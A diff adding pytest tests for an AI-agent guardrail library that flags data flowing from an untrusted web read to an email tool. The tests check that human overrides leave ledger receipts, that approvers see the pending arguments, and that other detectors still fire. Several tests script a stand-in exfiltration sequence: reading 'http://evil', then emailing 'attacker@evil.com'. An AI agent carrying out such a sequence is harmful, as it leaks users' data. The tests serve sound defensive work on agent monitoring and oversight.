@@ -342,3 +342,153 @@ def test_no_flow_policy_means_no_flow_enforcement():
         dispatch("read_webpage", {"url": "http://evil"})
         # Without a policy, the flow detector is absent and egress is allowed.
         assert dispatch("send_email", {"to": "attacker@evil.com"}) == "send_email-ok"
+
+
+# --- Human overrides leave a trace (ASI09 / ASI10) ------------------------
+
+def _install_fake_client(monkeypatch, decision: str = "approved") -> list:
+    """Stand in for the backend so remote mode can be driven in-process."""
+    created: list = []
+
+    class FakeClient:
+        def __init__(self, api_url, *a, **kw):
+            self.submitted: list = []
+            created.append(self)
+
+        def submit_interrupt(self, run_id, reason, context):
+            self.submitted.append((reason, context))
+            return f"int-{len(self.submitted)}", "http://local/x"
+
+        def wait_for_decision(self, interrupt_id, timeout=300.0, poll_interval=2.0):
+            return decision
+
+        def close(self):
+            pass
+
+    monkeypatch.setattr(agentbrake, "AgentBrakeClient", FakeClient)
+    return created
+
+
+def _kinds(ledger) -> list:
+    return [row["attestation"]["kind"] for row in ledger.all()]
+
+
+def test_approved_flow_violation_is_minted_into_the_ledger(monkeypatch):
+    """Regression: an approved exfiltration used to leave no ledger row at all.
+
+    The chain proved every attack stopped and stayed silent on the one a human
+    waved through — the event most worth auditing — while still verifying
+    clean. An override now mints its own receipt.
+    """
+    _install_fake_client(monkeypatch, decision="approved")
+    policy = block_exfiltration(
+        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
+    )
+    with agentbrake.run(
+        allowed_tools=["read_webpage", "send_email"],
+        budget_usd=10.0,
+        flow_policy=policy,
+        mode="remote",
+    ) as r:
+        dispatch("read_webpage", {"url": "http://evil"})
+        # The human approves, so the sink executes.
+        assert dispatch("send_email", {"to": "attacker@evil.com"}) == "send_email-ok"
+
+    assert _kinds(r.flow_ledger) == ["flow_override"]
+    att = r.flow_ledger.all()[0]["attestation"]
+    assert att["decision"] == "approve"
+    assert att["tool"] == "send_email"
+    assert att["interrupt_id"] == "int-1"
+    assert att["flow"]["violated_taints"] == ["untrusted"]
+
+
+def test_override_receipt_binds_the_arguments_that_were_approved(monkeypatch):
+    _install_fake_client(monkeypatch, decision="approved")
+    policy = block_exfiltration(
+        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
+    )
+    digests = []
+    for to in ("ok@example.com", "attacker@evil.com"):
+        with agentbrake.run(
+            allowed_tools=["read_webpage", "send_email"],
+            budget_usd=10.0,
+            flow_policy=policy,
+            mode="remote",
+        ) as r:
+            dispatch("read_webpage", {"url": "http://evil"})
+            dispatch("send_email", {"to": to})
+        digests.append(r.flow_ledger.all()[0]["attestation"]["tool_args_digest"])
+
+    assert digests[0] != digests[1]
+
+
+def test_interrupt_context_carries_the_pending_call(monkeypatch):
+    """The approver has to see the arguments, not just the tool name."""
+    created = _install_fake_client(monkeypatch, decision="approved")
+    policy = block_exfiltration(
+        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
+    )
+    with agentbrake.run(
+        allowed_tools=["read_webpage", "send_email"],
+        budget_usd=10.0,
+        flow_policy=policy,
+        mode="remote",
+    ):
+        dispatch("read_webpage", {"url": "http://evil"})
+        dispatch("send_email", {"to": "attacker@evil.com"})
+
+    reason, context = created[0].submitted[0]
+    assert reason == "FLOW"
+    pending = context["pending_call"]
+    assert pending["tool"] == "send_email"
+    assert pending["args"] == {"to": "attacker@evil.com"}
+    assert pending["args_digest"].startswith("sha256:")
+    # The pending call is deliberately not yet in the executed history.
+    assert [c["name"] for c in context["run_state"]["calls"]] == ["read_webpage"]
+
+
+def test_approving_one_detector_does_not_waive_the_others(monkeypatch):
+    """Regression: approval used to `break` out of the whole detector loop.
+
+    A human shown a FLOW violation was silently approving the budget and loop
+    violations queued behind it. Each detector now gets to fire on its own.
+    """
+    created = _install_fake_client(monkeypatch, decision="approved")
+    policy = block_exfiltration(
+        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
+    )
+    # Calls cost $0.01 each. This budget clears the first call and is blown by
+    # the second — the same call the FLOW violation lands on, so BUDGET is only
+    # ever reached if the loop carries on past the approved FLOW.
+    with agentbrake.run(
+        allowed_tools=["read_webpage", "send_email"],
+        budget_usd=0.015,
+        flow_policy=policy,
+        mode="remote",
+    ):
+        dispatch("read_webpage", {"url": "http://evil"})
+        dispatch("send_email", {"to": "attacker@evil.com"})
+
+    reasons = [reason for reason, _ in created[0].submitted]
+    assert "FLOW" in reasons
+    assert "BUDGET" in reasons  # would be absent if approval broke the loop
+
+
+def test_a_killed_flow_violation_still_mints_a_block_receipt(monkeypatch):
+    """The block path is unchanged: refusing to approve still blocks + mints."""
+    _install_fake_client(monkeypatch, decision="killed")
+    policy = block_exfiltration(
+        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
+    )
+    with agentbrake.run(
+        allowed_tools=["read_webpage", "send_email"],
+        budget_usd=10.0,
+        flow_policy=policy,
+        mode="remote",
+    ) as r:
+        dispatch("read_webpage", {"url": "http://evil"})
+        with pytest.raises(AgentBrakeInterrupt) as ei:
+            dispatch("send_email", {"to": "attacker@evil.com"})
+
+    assert ei.value.reason is InterruptReason.FLOW
+    assert _kinds(r.flow_ledger) == ["flow_block"]
